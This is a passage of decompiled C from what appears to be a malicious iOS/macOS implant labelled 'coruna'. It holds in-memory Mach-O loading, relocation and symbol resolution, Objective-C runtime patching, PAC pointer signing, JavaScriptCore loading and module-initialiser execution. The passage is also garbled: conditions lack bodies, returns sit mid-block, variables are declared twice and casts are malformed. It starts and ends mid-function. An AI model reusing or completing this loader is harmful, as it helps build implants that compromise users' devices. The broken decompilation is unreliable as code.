          entry = (byte *)(base + (unsigned long)type_id_8);
          ptr = entry + type_id_9;
          type_id_8 = 1;
          do {
            block = entry + 1;
            flags = *entry;
            copy = str;
            entry = block;
            if (flags >> 4 < 9) {
              type_id_9 = flags & 0xf;
              err = (int)addr;
              switch(flags >> 4) {
              default:
                entry = (uint8_t *)coruna_implant_via_copy_bytes_cc70(0,buf,host_info,val);
                *id_2 = buf;
                return entry;
              case 1:
                type_id_8 = type_id_9;
                break;
              case 2:
                base = coruna_implant_residual_43(type_id_9,buf);
                entry = (uint8_t *)0x930004;
                *id_2 = buf;
                return entry;
                type_id_15 = 0;
                type_id_14 = 0;
                data = block;
                do {
                  if (ptr <= data) {
                    type_id_15 = 0;
                    entry = block;
                    break;
                  }
                  entry = data + 1;
                  flags = *data;
                  type_id = ((unsigned long)flags & 0x7f) << (type_id_14 & 0x3f);
                  if (0x3f < (uint)type_id_14) {
                    type_id = 0;
                  }
                  type_id_15 = type_id | type_id_15;
                  type_id_14 = (unsigned long)((uint)type_id_14 + 7);
                  data = entry;
                } while ((char)flags < '\0');
                copy = (long *)(base + type_id_15);
                break;
              case 3:
                type_id_15 = 0;
                type_id_14 = 0;
                data = block;
                do {
                  if (ptr <= data) {
                    type_id_15 = 0;
                    entry = block;
                    break;
                  }
                  entry = data + 1;
                  flags = *data;
                  type_id = ((unsigned long)flags & 0x7f) << (type_id_14 & 0x3f);
                  if (0x3f < (uint)type_id_14) {
                    type_id = 0;
                  }
                  type_id_15 = type_id | type_id_15;
                  type_id_14 = (unsigned long)((uint)type_id_14 + 7);
                  data = entry;
                } while ((char)flags < '\0');
                copy = (long *)((long)str + type_id_15);
                break;
              case 4:
                type_id_15 = coruna_nop_stub(type_id_9,8);
                copy = (long *)((long)str + (type_id_15 & 0xffffffff));
                break;
              case 5:
                if ((flags & 0xf) != 0) {
                  obj = (long *)buf[0xb];
                  do {
                    if ((str < obj) ||
                       ((long *)((long)obj + (unsigned long)*(uint *)(buf + 0x15)) <= copy))
                    *id_2 = buf;
                    return entry;
                    if (type_id_8 == 2) {
                      *(int *)copy = (int)*copy + err;
                    }
                    else if (type_id_8 == 1) {
                      *copy = *copy + addr;
                    }
                    copy = copy + 1;
                    type_id_9 = type_id_9 - 1;
                  } while (type_id_9 != 0);
                }
                break;
              case 6:
                type_id_15 = 0;
                type_id_14 = 0;
                data = block;
                do {
                  entry = block;
                  if (ptr <= data) goto load_ok_19;
                  entry = data + 1;
                  flags = *data;
                  type_id = ((unsigned long)flags & 0x7f) << (type_id_14 & 0x3f);
                  if (0x3f < (uint)type_id_14) {
                    type_id = 0;
                  }
                  type_id_15 = type_id | type_id_15;
                  type_id_14 = (unsigned long)((uint)type_id_14 + 7);
                  data = entry;
                } while ((char)flags < '\0');
                if (type_id_15 != 0) {
                  obj = (long *)buf[0xb];
                  type_id_14 = 2;
                  do {
                    if ((str < obj) ||
                       ((long *)((long)obj + (unsigned long)*(uint *)(buf + 0x15)) <= copy))
                    *id_2 = buf;
                    return entry;
                    if (type_id_8 == 2) {
                      *(int *)copy = (int)*copy + err;
                    }
                    else if (type_id_8 == 1) {
                      *copy = *copy + addr;
                    }
                    copy = copy + 1;
                    status = type_id_14 <= type_id_15;
                    type_id_14 = (unsigned long)((int)type_id_14 + 1);
                  } while (status);
                }
                break;
              case 7:
                if (str < (long *)buf[0xb] ||
                    (long *)(buf[0xb] + (unsigned long)*(uint *)(buf + 0x15)) <= str)
                *id_2 = buf;
                return entry;
                if (type_id_8 == 2) {
                  *(int *)str = (int)*str + err;
                }
                else if (type_id_8 == 1) {
                  *str = *str + addr;
                }
                type_id_15 = 0;
                type_id_14 = 0;
                data = block;
                do {
                  if (ptr <= data) {
                    type_id_15 = 0;
                    entry = block;
                    break;
                  }
                  entry = data + 1;
                  flags = *data;
                  type_id = ((unsigned long)flags & 0x7f) << (type_id_14 & 0x3f);
                  if (0x3f < (uint)type_id_14) {
                    type_id = 0;
                  }
                  type_id_15 = type_id | type_id_15;
                  type_id_14 = (unsigned long)((uint)type_id_14 + 7);
                  data = entry;
                } while ((char)flags < '\0');
                copy = (long *)((long)str + type_id_15 + 8);
                break;
              case 8:
                type_id_15 = 0;
                type_id_14 = 0;
                do {
                  if (ptr <= entry) {
                    type_id_15 = 0;
                    data = block;
                    break;
                  }
                  data = entry + 1;
                  flags = *entry;
                  type_id = ((unsigned long)flags & 0x7f) << (type_id_14 & 0x3f);
                  if (0x3f < (uint)type_id_14) {
                    type_id = 0;
                  }
                  type_id_15 = type_id | type_id_15;
                  type_id_14 = (unsigned long)((uint)type_id_14 + 7);
                  entry = data;
                } while ((char)flags < '\0');
                type_id_14 = 0;
                type_id = 0;
                block = data;
                do {
                  if (ptr <= block) {
                    type_id_14 = 0;
                    entry = data;
                    break;
                  }
                  entry = block + 1;
                  flags = *block;
                  type_id_11 = ((unsigned long)flags & 0x7f) << (type_id & 0x3f);
                  if (0x3f < (uint)type_id) {
                    type_id_11 = 0;
                  }
                  type_id_14 = type_id_11 | type_id_14;
                  type_id = (unsigned long)((uint)type_id + 7);
                  block = entry;
                } while ((char)flags < '\0');
                if (type_id_15 != 0) {
                  obj = (long *)buf[0xb];
                  type_id = 2;
                  do {
                    if ((str < obj) ||
                       ((long *)((long)obj + (unsigned long)*(uint *)(buf + 0x15)) <= str))
                    *id_2 = buf;
                    return entry;
                    if (type_id_8 == 2) {
                      *(int *)str = (int)*str + err;
                    }
                    else if (type_id_8 == 1) {
                      *str = *str + addr;
                    }
                    str = (long *)((long)str + type_id_14 + 8);
                    status = type_id <= type_id_15;
                    type_id = (unsigned long)((int)type_id + 1);
                    copy = str;
                  } while (status);
                }
              }
            }
load_ok_19:
            str = copy;
          } while (entry < ptr);
        }
load_ok_18:
        entry = (uint8_t *)coruna_implant_via_copy_bytes_cc70(0,buf,host_info,val);
        *id_2 = buf;
        return entry;
        type_id_16 = 1;
      }
      else {
        type_id_16 = 0;
      }
      block = (uint8_t *)coruna_implant_via_copy_bytes_cc70(type_id_16,buf,host_info,val);
    }
  }
  else {
    entry = (uint8_t *)0xad008;
    if (((*(byte *)((long)buf + 0xac) >> 6 & 1) == 0) ||
       *id_2 = buf;
       return entry;
    sa_new = (uint *)0x0;
    block = (uint8_t *)coruna_find_mod_init_func(buf,*(int *)(handle + 8),&sa_new);
    entry_13 = sa_new;
    if (((int)block == 0) &&
       ((((block = (uint8_t *)0x920003, *sa_new == 0 && (0x1b < sa_new[1])) &&
         (0x1b < sa_new[2])) && (0x1b < sa_new[3])))) {
      type_id_8 = sa_new[4];
      if ((type_id_8 != 0) && (sa_new[6] == 0)) {
        if (type_id_8 >> 0x10 == 0) {
          err = (type_id_8 & 0xffff) << 3;
          base = coruna_implant_via_driver_copy_port_1918_2(val,err,0);
          if (base == 0) {
            block = (uint8_t *)0xad009;
          }
          else {
            coruna_copy_bytes_cc70(base,err);
            handle = 0;
            type_id_9 = entry_13[3];
            entry_9 = entry_13;
            do {
              if (entry_13[5] != 1) {
                block = (uint8_t *)0x920004;
                goto load_ok_20;
              }
              type_id_13 = *(uint *)((long)entry_9 + (unsigned long)entry_13[2]);
              kind = (int)(char)type_id_13;
              if ((type_id_13 & 0xff) < 0xf1) {
                kind = type_id_13 & 0xff;
              }
              ptr = (uint64_t *)(base + handle);
              block = (uint8_t *)
                        coruna_resolve_libcache_sym((long)entry_13 + (unsigned long)(type_id_13 >> 9) + (unsigned long)type_id_9,
                                     host_info,val,ptr,kind);
              str = sa_new;
              if ((int)block == 0x910006 && (type_id_13 & 0x100) != 0) {
                type_id_16 = 0;
              }
              else {
                if ((int)block != 0) goto load_ok_20;
                type_id_16 = *ptr;
              }
              *ptr = type_id_16;
              entry_9 = entry_9 + 1;
              handle = handle + 8;
            } while ((unsigned long)type_id_8 * 8 - handle != 0);
            block = (uint8_t *)0xad001;
            if (sa_new != (uint *)0x0) {
              type_id_9 = sa_new[1];
              entry_13 = (uint *)((long)sa_new + (unsigned long)type_id_9);
              if ((entry_13 >= sa_new && type_id_9 <= *(uint *)(buf[5] + 0xc)) &&
                  (entry_13 < sa_new || *(uint *)(buf[5] + 0xc) != type_id_9)) {
                type_id_9 = *entry_13;
                if (type_id_9 == 0) {
                  block = (uint8_t *)0x0;
                }
                else {
                  type_id_15 = 0;
                  do {
                    if (entry_13[type_id_15 + 1] != 0) {
                      entry_9 = (uint *)((long)entry_13 + (unsigned long)entry_13[type_id_15 + 1]);
                      if (entry_9 < str ||
                          (uint *)((long)str + (unsigned long)*(uint *)(buf[5] + 0xc)) <= entry_9) {
                        block = (uint8_t *)0x920001;
                        break;
                      }
                      type_id_14 = 0;
                      while (type_id_14 < (ushort)entry_9[5]) {
                        version = *(ushort *)((long)entry_9 + type_id_14 * 2 + 0x16);
                        if ((unsigned long)version == 0xffff) {
                          block = (uint8_t *)0x0;
                        }
                        else if ((short)version < 0) {
                          do {
                            port = *(ushort *)
                                      ((long)entry_9 + ((unsigned long)version & 0x7fff) * 2 + 0x16);
                            block = (uint8_t *)
                                      coruna_return_zero_e120(buf,base,type_id_8 & 0xffff,entry_9,type_id_14,
                                                   port & 0x7fff);
                            if ((int)block != 0) break;
                          } while (-1 < (short)port);
                        }
                        else {
                          block = (uint8_t *)
                                    coruna_return_zero_e120(buf,base,type_id_8 & 0xffff,entry_9,type_id_14);
                        }
                        type_id_14 = type_id_14 + 1;
                        if ((int)block != 0) goto load_ok_20;
                      }
                      type_id_9 = *entry_13;
                    }
                    block = (uint8_t *)0x0;
                    type_id_15 = type_id_15 + 1;
                  } while (type_id_15 < type_id_9);
                }
              }
              else {
                block = (uint8_t *)0x920001;
              }
            }
load_ok_20:
            coruna_implant_via_driver_copy_port_1918(val,base,err);
          }
        }
        else {
          block = (uint8_t *)0xad001;
        }
      }
    }
  }
  entry = block;
  if (((int)block != 0) ||
     *id_2 = buf;
     return entry;
  if (*bootargs != 0) {
    action = (void (*)0x0;
    block_ctx = (void (*)0x0;
    coruna_copy_bytes_cc70(&sa_new,0x20);
    base = (*(void (*)val[1])(*bootargs,"object_getClass");
    handle = (*(void (*)val[1])(*bootargs,"_objc_patch_root_of_class");
    buf = (void (*)(*(void (*)val[1])(*bootargs,"_objc_map_images");
    if (base == 0) {
      return (uint8_t *)0x18002;
    }
    err = (*(void (*)val[2])(base,&sa_new);
    base = path_buf[0];
    if (err == 0) {
      return (uint8_t *)0x18003;
    }
    block = (uint8_t *)coruna_macho_find_section("__TEXT","__text",path_buf[0],&sa_saved,&stack_guard);
    if ((int)block != 0) {
      return block;
    }
    err = *(int *)(path_buf[0] + 0x10);
    if (err != 0) {
      err = (int *)(path_buf[0] + 0x20);
      do {
        if (*err == 0x25) {
          addr = 8;
load_ok_21:
          type_id_8 = *(uint *)((long)err + addr);
          if ((handle == 0) || (type_id_8 < 0x110000)) goto load_ok_22;
          err = coruna_macho_find_section("__AUTH_CONST","__const",path_buf[0],region,&tmp_buf);
          if (err == 0x18006) {
            err = coruna_macho_find_section("__DATA_CONST","__const",path_buf[0],region,&tmp_buf);
          }
          if ((((err != 0) || (region[0] == 0)) || (tmp_buf < 0x19)) ||
             ((0xfffffffe < tmp_buf || ((long)tmp_buf < 0x20)))) goto load_ok_22;
          str = (long *)(region[0] + 0x18);
          goto load_ok_23;
        }
        if (*err == 0x32) {
          addr = 0xc;
          goto load_ok_21;
        }
        err = (int *)((long)err + (unsigned long)(uint)err[1]);
        err = err + -1;
      } while (err != 0);
    }
    return (uint8_t *)0x18009;
  }
  goto load_ok_24;
invalid:
  thread_attr = (unsigned long *)(buf + 7);
  bootargs = buf + 0xf;
  err = *count;
  if (err < 0xb) {
    if (err == -0x7fffffe8) {
load_ok_25:
      flags = (int *)((long)count + (unsigned long)(uint)count[2]);
      if (flags < err || status <= flags) {
        return (uint8_t *)0x17001;
      }
      err = coruna_return_zero_cd74(flags,"@rpath",6);
      base = 6;
      if (err != 0) {
        base = 0;
      }
      handle = (*(void (*)*val)((long)flags + base,2);
      if (handle == 0) {
        return (uint8_t *)0x17004;
      }
      type_id_15 = (unsigned long)serial_buf;
      if (serial_buf == 0x40) {
        return (uint8_t *)0x17005;
      }
      serial_buf = serial_buf + 1;
      host_info[type_id_15] = handle;
      err = coruna_implant_residual_41((long)flags + base,"/usr/lib/libobjc.A.dylib");
      if (err == 0) {
        *bootargs = handle;
      }
    }
    else if (err == 2) {
      buf[6] = (long)count;
      type_id_15 = buf[1] + (unsigned long)(uint)count[4];
      buf[9] = type_id_15;
      type_id_14 = buf[0xb];
      if (type_id_15 < type_id_14 || type_id_14 + *(uint *)(buf + 0x15) <= type_id_15) {
        return (uint8_t *)0x17001;
      }
      type_id_15 = buf[1] + (unsigned long)(uint)count[2];
      *thread_attr = type_id_15;
      if (type_id_15 < type_id_14 || type_id_14 + *(uint *)(buf + 0x15) <= type_id_15) {
        return (uint8_t *)0x17001;
      }
    }
  }
  else {
    if (err == 0xc) goto load_ok_25;
    if (err == 0xb) {
      buf[8] = (long)count;
    }
  }
  type_id_8 = type_id_8 + 1;
  base = *buf;
  if (*(uint *)(base + 0x10) <= type_id_8) goto nomem;
  count = (int *)((long)count + (unsigned long)(uint)count[1]);
  err = (int *)buf[0xd];
  status = (int *)((long)err + buf[0x14]);
  if (count < err || status <= count) {
    return (uint8_t *)0x17001;
  }
  goto invalid;
load_ok_26:
  entry = &k_implant_rodata_word_12008;
  *id_2 = buf;
  return entry;
  while (str = str + 1, str <= (long *)((tmp_buf + region[0]) - 8)) {
load_ok_23:
    if (*str == handle) {
      copy = (void (*)str[-3];
      str = (void (*)str[-1];
      if ((((sa_saved <= copy && copy < sa_saved + stack_guard) && sa_saved <= str) &&
           str < sa_saved + stack_guard) &&
         *(uint *)(buf + 0x11) = type_id_8;
         buf[0x10] = base;
         buf[0x12] = (long)buf;
         buf[0x13] = (long)action;
         sa_new = (uint *)buf[0xb];
         path_buf[0] = 0;
         path_buf[1] = 0;
         (*buf)(1,path_buf,&sa_new);
         block = (uint8_t *)coruna_load_javascriptcore(buf,val);
         if ((int)block != 0) {
         return block;
         }
      break;
    }
  }
load_ok_22:
  if ((int)type_id_8 < 0xf0000) {
    if ((int)type_id_8 < 0xe0000) {
      if ((int)type_id_8 < 0xd0400) {
        if ((int)type_id_8 < 0xd0200) {
          if (type_id_8 != 0xd0000) {
            type_id_9 = 0x100;
load_ok_28:
            type_id_9 = type_id_9 | 0xd0000;
            type_id_8 = 0x8008;
            return (uint8_t *)(unsigned long)(type_id_8 | 0x10000);
          }
        }
        else if (type_id_8 != 0xd0200) {
          type_id_9 = 0x300;
          type_id_9 = type_id_9 | 0xd0000;
          type_id_8 = 0x8008;
          return (uint8_t *)(unsigned long)(type_id_8 | 0x10000);
        }
      }
      else if ((int)type_id_8 < 0xd0600) {
        if (type_id_8 != 0xd0400) {
          type_id_9 = 0x500;
          type_id_9 = type_id_9 | 0xd0000;
          type_id_8 = 0x8008;
          return (uint8_t *)(unsigned long)(type_id_8 | 0x10000);
        }
      }
      else if (type_id_8 != 0xd0600) {
        type_id_9 = 0x700;
        type_id_9 = type_id_9 | 0xd0000;
        type_id_8 = 0x8008;
        return (uint8_t *)(unsigned long)(type_id_8 | 0x10000);
      }
    }
    else if ((int)type_id_8 < 0xe0400) {
      if ((int)type_id_8 < 0xe0200) {
        if (type_id_8 != 0xe0000) {
          type_id_9 = 0x100;
          type_id_9 = type_id_9 | 0xe0000;
          type_id_8 = 0x8008;
          return (uint8_t *)(unsigned long)(type_id_8 | 0x10000);
        }
      }
      else if (type_id_8 != 0xe0200) {
        type_id_9 = 0x300;
        type_id_9 = type_id_9 | 0xe0000;
        type_id_8 = 0x8008;
        return (uint8_t *)(unsigned long)(type_id_8 | 0x10000);
      }
    }
    else if ((int)type_id_8 < 0xe0600) {
      if (type_id_8 != 0xe0400) {
        type_id_9 = 0x500;
        type_id_9 = type_id_9 | 0xe0000;
        type_id_8 = 0x8008;
        return (uint8_t *)(unsigned long)(type_id_8 | 0x10000);
      }
    }
    else if ((type_id_8 != 0xe0600) && (type_id_8 != 0xe0700)) {
      type_id_9 = 0x800;
load_ok_30:
      type_id_9 = type_id_9 | 0xe0000;
load_ok_29:
      type_id_8 = 0x8008;
      return (uint8_t *)(unsigned long)(type_id_8 | 0x10000);
    }
  }
  else if ((int)type_id_8 < 0xf0800) {
    if ((int)type_id_8 < 0xf0400) {
      if ((int)type_id_8 < 0xf0200) {
        if (type_id_8 != 0xf0000) {
          type_id_9 = 0x100;
load_ok_32:
          type_id_9 = type_id_9 | 0xf0000;
          type_id_8 = 0x8008;
          return (uint8_t *)(unsigned long)(type_id_8 | 0x10000);
        }
      }
      else if (type_id_8 != 0xf0200) {
        type_id_9 = 0x300;
        type_id_9 = type_id_9 | 0xf0000;
        type_id_8 = 0x8008;
        return (uint8_t *)(unsigned long)(type_id_8 | 0x10000);
      }
    }
    else if ((int)type_id_8 < 0xf0600) {
      if (type_id_8 != 0xf0400) {
        type_id_9 = 0x500;
        type_id_9 = type_id_9 | 0xf0000;
        type_id_8 = 0x8008;
        return (uint8_t *)(unsigned long)(type_id_8 | 0x10000);
      }
    }
    else if (type_id_8 != 0xf0600) {
      type_id_9 = 0x700;
      type_id_9 = type_id_9 | 0xf0000;
      type_id_8 = 0x8008;
      return (uint8_t *)(unsigned long)(type_id_8 | 0x10000);
    }
  }
  else if ((int)type_id_8 < 0x100300) {
    if ((int)type_id_8 < 0x100100) {
      if ((type_id_8 != 0xf0800) && (type_id_8 != 0x100000)) {
load_ok_31:
        type_id_8 = 0x8008;
check_ok:
        return (uint8_t *)(unsigned long)(type_id_8 | 0x10000);
      }
    }
    else if (type_id_8 != 0x100100) {
      type_id_9 = 0x200;
      type_id_9 = type_id_9 | 0x100000;
      type_id_8 = 0x8008;
      return (uint8_t *)(unsigned long)(type_id_8 | 0x10000);
    }
  }
  else if ((int)type_id_8 < 0x100500) {
    if (type_id_8 != 0x100300) {
      type_id_9 = 0x400;
      type_id_9 = type_id_9 | 0x100000;
      type_id_8 = 0x8008;
      return (uint8_t *)(unsigned long)(type_id_8 | 0x10000);
    }
  }
  else if ((type_id_8 != 0x100500) && (type_id_8 != 0x100700)) {
    type_id_9 = 0x600;
load_ok_33:
    type_id_9 = type_id_9 | 0x100000;
    type_id_8 = 0x8008;
    return (uint8_t *)(unsigned long)(type_id_8 | 0x10000);
  }
  type_id_9 = 0xfffff;
  if (type_id_8 < 0xf0000) {
    type_id_9 = 0xdffff;
  }
  type_id_10 = 6;
  if (type_id_8 < 0xf0000) {
    type_id_10 = 1;
  }
  ptr = "objc_retainAutorelease";
  if (type_id_8 < 0xf0000) {
    ptr = "_objc_flush_caches";
  }
  size = 5;
  if (type_id_8 <= type_id_9) {
    size = type_id_10;
  }
  block = (uint8_t *)coruna_bind_resolver(val,ptr,size,sa_saved,stack_guard,&block_ctx);
  if ((int)block != 0) {
    return block;
  }
  if ((int)type_id_8 < 0xf0000) {
    if ((int)type_id_8 < 0xe0000) {
      if ((int)type_id_8 < 0xd0400) {
        if ((int)type_id_8 < 0xd0200) {
          if (type_id_8 != 0xd0000) {
            type_id_9 = 0x100;
load_ok_34:
            type_id_9 = type_id_9 | 0xd0000;
            goto load_ok_35;
          }
        }
        else if (type_id_8 != 0xd0200) {
          type_id_9 = 0x300;
          goto load_ok_34;
        }
      }
      else if ((int)type_id_8 < 0xd0600) {
        if (type_id_8 != 0xd0400) {
          type_id_9 = 0x500;
          goto load_ok_34;
        }
      }
      else if (type_id_8 != 0xd0600) {
        type_id_9 = 0x700;
        goto load_ok_34;
      }
    }
    else if ((int)type_id_8 < 0xe0400) {
      if ((int)type_id_8 < 0xe0200) {
        if (type_id_8 != 0xe0000) {
          type_id_9 = 0x100;
          type_id_9 = type_id_9 | 0xe0000;
        }
      }
      else if (type_id_8 != 0xe0200) {
        type_id_9 = 0x300;
        type_id_9 = type_id_9 | 0xe0000;
      }
    }
    else if ((int)type_id_8 < 0xe0600) {
      if (type_id_8 != 0xe0400) {
        type_id_9 = 0x500;
        type_id_9 = type_id_9 | 0xe0000;
      }
    }
    else if ((type_id_8 != 0xe0600) && (type_id_8 != 0xe0700)) {
      type_id_9 = 0x800;
load_ok_36:
      type_id_9 = type_id_9 | 0xe0000;
load_ok_35:
      if (type_id_8 != type_id_9) {
        return (uint8_t *)0x18008;
      }
    }
  }
  else if ((int)type_id_8 < 0xf0800) {
    if ((int)type_id_8 < 0xf0400) {
      if ((int)type_id_8 < 0xf0200) {
        if (type_id_8 != 0xf0000) {
          type_id_9 = 0x100;
load_ok_37:
          type_id_9 = type_id_9 | 0xf0000;
          goto load_ok_35;
        }
      }
      else if (type_id_8 != 0xf0200) {
        type_id_9 = 0x300;
        goto load_ok_37;
      }
    }
    else if ((int)type_id_8 < 0xf0600) {
      if (type_id_8 != 0xf0400) {
        type_id_9 = 0x500;
        goto load_ok_37;
      }
    }
    else if (type_id_8 != 0xf0600) {
      type_id_9 = 0x700;
      goto load_ok_37;
    }
  }
  else if ((int)type_id_8 < 0x100300) {
    if ((int)type_id_8 < 0x100100) {
      if ((type_id_8 != 0xf0800) && (type_id_8 != 0x100000)) {
        return (uint8_t *)0x18008;
      }
    }
    else if (type_id_8 != 0x100100) {
      type_id_9 = 0x200;
      goto load_ok_38;
    }
  }
  else if ((int)type_id_8 < 0x100500) {
    if (type_id_8 != 0x100300) {
      type_id_9 = 0x400;
      goto load_ok_38;
    }
  }
  else if ((type_id_8 != 0x100500) && (type_id_8 != 0x100700)) {
    type_id_9 = 0x600;
load_ok_38:
    type_id_9 = type_id_9 | 0x100000;
    goto load_ok_35;
  }
  if (type_id_8 >> 0x14 == 0) {
    type_id_10 = 5;
    if (0x3c0 < type_id_8 >> 10) {
      type_id_10 = 6;
    }
    if (type_id_8 < 0xf0000) {
      if (type_id_8 < 0xe0000) {
        type_id_10 = 8;
        if (type_id_8 >> 9 < 0x681) {
          type_id_10 = 4;
        }
      }
      else {
        type_id_10 = 0xc;
      }
    }
  }
  else {
    type_id_10 = 8;
  }
  block = (uint8_t *)
            coruna_bind_resolver(val,"_objc_flush_caches",type_id_10,sa_saved,stack_guard,&action);
  buf = block_ctx;
  if ((int)block != 0) {
    return block;
  }
load_ok_27:
  *(uint *)(buf + 0x11) = type_id_8;
  buf[0x10] = base;
  buf[0x12] = (long)buf;
  buf[0x13] = (long)action;
  sa_new = (uint *)buf[0xb];
  path_buf[0] = 0;
  path_buf[1] = 0;
  (*buf)(1,path_buf,&sa_new);
  block = (uint8_t *)coruna_load_javascriptcore(buf,val);
  if ((int)block != 0) {
    return block;
  }
load_ok_24:
  if (*(int *)(*buf + 0x10) != 0) {
    type_id_8 = 0;
    handle = buf[10];
    base = buf[0xc];
    err = (int *)(buf[0xd] + 0x20);
    do {
      if ((*err == 0x19) && (err = coruna_implant_residual_41(err + 2,"__PAGEZERO"), err != 0)) {
        err = err[0xf];
        if (err == 0) {
          err = 1;
        }
        if (*(char *)((long)val + 0x5c5) != '\0') {
          err = *(int *)(val + 0xb9);
        }
        err = coruna_driver_copy_port_1918(val,(base - handle) + *(long *)(err + 6),
                              *(uint64_t *)(err + 8),err);
        if (err != 0) {
          entry = (uint8_t *)0x14005;
          *id_2 = buf;
          return entry;
        }
      }
      err = (int *)((long)err + (unsigned long)(uint)err[1]);
      type_id_8 = type_id_8 + 1;
    } while (type_id_8 < *(uint *)(*buf + 0x10));
  }
  flags = *(byte *)((long)buf + 0xac);
  if ((flags >> 4 & 1) == 0) {
    entry = (uint8_t *)0x1a001;
    *id_2 = buf;
    return entry;
    if ((flags & 5) != 0) {
      base = (*(void (*)*val)("/usr/lib/libSystem.dylib",0x11);
      if (base == 0) {
        type_id_8 = 0xd001;
      }
      else {
        buf = (void (*)(*(void (*)val[1])(base,"_NSGetMachExecuteHeader");
        if ((((buf != (void (*)0x0) &&
             (str = (void (*)(*(void (*)val[1])(base,"_NSGetArgc"), str != (void (*)0x0))
            && (copy = (void (*)(*(void (*)val[1])(base,"_NSGetArgv"), copy != (void (*)0x0
               )) && ((data = (void (*)(*(void (*)val[1])(base,"_NSGetEnviron"),
                      data != (void (*)0x0 &&
                      (obj = (void (*)(*(void (*)val[1])(base,"_NSGetProgname"),
                      obj != (void (*)0x0)))) {
          handle = (*buf)();
          buf[0x17] = handle;
          handle = (*str)();
          buf[0x18] = handle;
          handle = (*copy)();
          buf[0x19] = handle;
          handle = (*data)();
          buf[0x1a] = handle;
          handle = (*obj)();
          buf[0x1b] = handle;
          (*(void (*)val[3])(base);
          flags = *(byte *)((long)buf + 0xac);
          goto load_ok_39;
        }
        (*(void (*)val[3])(base);
        type_id_8 = 0xd002;
      }
      entry = (uint8_t *)(unsigned long)((type_id_8 | 0xfff60000) + 0xad001);
      *id_2 = buf;
      return entry;
    }
load_ok_39:
    base = buf[10];
    if ((flags >> 2 & 1) != 0) {
      handle = *buf;
      if (*(int *)(handle + 0x10) != 0) {
        type_id_8 = 0;
        addr = buf[0xc];
        err = (int *)(buf[0xd] + 0x20);
        do {
          if (*err == 0x1a) {
            buf = (void (*)((addr - base) + *(long *)(err + 2));
            if (buf < (void (*)buf[0xc] ||
                entry = &k_implant_rodata_word_12008;
                *id_2 = buf;
                return entry;
            err = coruna_return_zero();
            if (err != 0) {
              buf = (void (*)coruna_pacia(buf,0);
            }
            (*buf)(*(uint32_t *)buf[0x18],*(uint64_t *)buf[0x19],
                       *(uint64_t *)buf[0x1a],0,buf + 0x17);
            handle = *buf;
          }
          err = (int *)((long)err + (unsigned long)(uint)err[1]);
          type_id_8 = type_id_8 + 1;
        } while (type_id_8 < *(uint *)(handle + 0x10));
        base = buf[10];
        flags = *(byte *)((long)buf + 0xac);
      }
    }
    if ((flags & 1) != 0) {
      handle = *buf;
      if (*(int *)(handle + 0x10) != 0) {
        type_id_8 = 0;
        addr = buf[0xb];
        err = (int *)(buf[0xd] + 0x20);
        do {
          if (*err == 0x19) {
            count = err + 0x12;
            status = count + (unsigned long)(uint)err[0x10] * 0x14;
            if (count < status) {
              do {
                if (((char)count[0x10] == '\t') && (7 < *(unsigned long *)(count + 10))) {
                  handle = *(long *)(count + 8);
                  type_id_15 = 0;
                  type_id_14 = 1;
                  do {
                    buf = *(void (**)((addr - base) + handle + type_id_15 * 8);
                    if (buf < (void (*)buf[0xb] ||
                        (void (*)buf[0xb] + *(uint *)(buf + 0x15) <= buf)
                    entry = &k_implant_rodata_word_12008;
                    *id_2 = buf;
                    return entry;
                    err = coruna_return_zero();
                    if (err != 0) {
                      buf = (void (*)coruna_pacia(buf,0);
                    }
                    (*buf)(*(uint32_t *)buf[0x18],*(uint64_t *)buf[0x19],
                               *(uint64_t *)buf[0x1a],0,buf + 0x17);
                    status = type_id_14 < *(unsigned long *)(count + 10) >> 3;
                    type_id_15 = type_id_14;
                    type_id_14 = (unsigned long)((int)type_id_14 + 1);
                  } while (status);
                }
                count = count + 0x14;
              } while (count < status);
              handle = *buf;
            }
          }
          entry = (uint8_t *)0x0;
          err = (int *)((long)err + (unsigned long)(uint)err[1]);
          type_id_8 = type_id_8 + 1;
        } while (type_id_8 < *(uint *)(handle + 0x10));
        *id_2 = buf;
        return entry;
      }
    }
  }
  entry = (uint8_t *)0x0;
again:
  *id_2 = buf;
  return entry;
}





uint8_t * coruna_implant08_via_return_zero(uint64_t val,long *handle,long addr_2,unsigned long *arg)
{
  unsigned long u;
  int err;
  long handle;
  long addr;
  int *err;
  int *status;
  long *ptr;
  unsigned long size;
  
  if (addr_2 == 0) {
    return (uint8_t *)0xad001;
  }
  if (arg == (unsigned long *)0x0) {
    return (uint8_t *)0xad001;
  }
  if (handle == (long *)0x0) {
    return (uint8_t *)0xad001;
  }
  addr = handle[7];
  if (addr == 0) {
    return (uint8_t *)0xad001;
  }
  if (handle[9] == 0) {
    return (uint8_t *)0xad001;
  }
  *arg = 0;
  handle = handle[6];
  if (*(int *)(handle + 0xc) == 0) {
    return &k_implant_rodata_word_12001;
  }
  size = 0;
  ptr = (long *)(addr + 8);
  do {
    if ((*(byte *)((long)ptr + -4) & 0xe1) == 1) {
      err = coruna_implant_residual_41(addr_2,handle[9] + (unsigned long)*(uint *)(ptr + -1));
      if (err == 0) {
        size = (handle[0xc] - handle[10]) + *ptr;
        *arg = size;
        err = *(int *)(*handle + 0x10);
        if (err != 0) {
          status = (int *)(handle[0xd] + 0x20);
          while (((*status != 0x19 ||
                  (u = *(long *)(status + 6) + (handle[0xc] - handle[10]), size < u)) ||
                 (*(long *)(status + 8) + u <= size))) {
            status = (int *)((long)status + (unsigned long)(uint)status[1]);
            err = err + -1;
            if (err == 0) {
              return (uint8_t *)0x0;
            }
          }
          err = status + 0x12;
          status = err + (unsigned long)(uint)status[0x10] * 0x14;
          if (err < status) {
            while ((u = *(long *)(err + 8) + (handle[0xc] - handle[10]), size < u ||
                   (*(long *)(err + 10) + u <= size))) {
              err = err + 0x14;
              if (status <= err) {
                return (uint8_t *)0x0;
              }
            }
            if ((err[0x10] & 0x80000400U) != 0) {
              err = coruna_return_zero();
              if (err != 0) {
                size = coruna_pacia(size,0);
              }
              *arg = size;
              return (uint8_t *)0x0;
            }
          }
        }
        return (uint8_t *)0x0;
      }
      handle = handle[6];
    }
    size = size + 1;
    ptr = ptr + 2;
  } while (size < *(uint *)(handle + 0xc));
  return &k_implant_rodata_word_12001;
}





uint8_t * coruna_implant08_via_driver_copy_port_1918(long handle,long *addr_2)
{
  long handle;
  long addr;
  byte err;
  int err;
  long off;
  long base;
  void (*ptr)(void);
  uint8_t *ptr;
  uint u;
  int *err;
  int *status;
  int *flags;
  
  err = *(byte *)((long)addr_2 + 0xac);
  if (-1 < (char)err) {
    if ((((err >> 4 & 1) == 0) && ((err >> 1 & 1) != 0)) &&
